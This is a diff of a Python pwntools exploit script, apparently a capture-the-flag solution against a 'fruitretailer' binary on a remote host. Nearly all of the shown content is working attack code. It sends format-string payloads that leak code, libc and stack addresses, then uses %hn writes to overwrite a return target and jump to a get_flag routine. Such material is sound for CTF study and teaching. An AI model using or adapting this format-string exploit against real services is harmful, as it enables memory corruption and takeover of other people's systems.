@@ -23,13 +23,13 @@ def change_label(idx,label):
 	
 #r = process("./fruitretailer")
 r = remote("125.235.240.167", 5000)
-#raw_input("?")
+
 r.recvuntil("choice:")
-payload = 'A'*64
-payload += '%9$p-%13$p-%6$p-'
+payload = 'A'*64 + '%9$p-%13$p-%6$p-'
 buy(2,'1'*11,'Y',payload)
 change_label(1,'A'*10)
 msg = create().split("\n")[2].split("|")[6].split('-')
+
 codebase = int(msg[0],16)-0x14b0
 libc = int(msg[1],16)-0x20830
 stack = int(msg[2],16)+8
@@ -37,10 +37,12 @@ get_flag = codebase + 0xC92
 log.info("code base: %#x",codebase)
 log.info("libc base: %#x",libc)
 log.info("stack: %#x",stack)
+
 payload = 'A'*64 + '%'+str(stack&0xffff)+'x%6$hn'
 buy(2,'1'*11,'Y',payload)
 change_label(2,'A'*10)
 create()
+
 payload = 'A'*64 + '%'+str(get_flag&0xffff)+'x%8$hn'
 buy(2,'1'*11,'Y',payload)
 change_label(3,'A'*10)
